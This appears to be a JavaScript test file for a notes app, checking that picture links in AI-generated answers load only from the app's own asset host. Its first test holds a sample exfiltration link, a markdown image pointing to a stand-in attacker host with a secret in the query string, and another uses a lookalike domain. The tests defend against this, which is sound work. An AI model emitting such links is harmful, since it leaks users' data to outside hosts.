// A model answer may only point at pictures stored next to the notes; any other address would be loaded by the page.
import test from "node:test";
import assert from "node:assert/strict";
import { loadTs } from "./helpers/loadTs.mjs";
const { parseAiBlocks } = await loadTs("../src/aiBlocks.ts");

const markdown = (text) => [{ type: "paragraph", content: text }];

test("a foreign picture address in an AI answer becomes plain text", () => {
  const blocks = parseAiBlocks(markdown, "до\n\n![схема](https://evil.example/leak?q=секрет)\n\nпосле");
  assert.ok(!JSON.stringify(blocks).includes("evil.example"));
  assert.ok(blocks.some((b) => b.type === "paragraph" && String(b.content).includes("[схема]")));
  assert.ok(!blocks.some((b) => b.type === "image"));
});

test("a picture stored next to the notes stays a picture", () => {
  const blocks = parseAiBlocks(markdown, "![фото](https://assets.notepadhub.local/a1b2.png)");
  const image = blocks.find((b) => b.type === "image");
  assert.ok(image && image.props.url === "https://assets.notepadhub.local/a1b2.png");
});

test("data and file addresses are refused too", () => {
  for (const url of ["data:image/png;base64,AAAA", "file:///C:/secret.png", "http://assets.notepadhub.local.evil.example/x.png"]) {
    const blocks = parseAiBlocks(markdown, `![x](${url})`);
    assert.ok(!blocks.some((b) => b.type === "image"), url);
  }
});
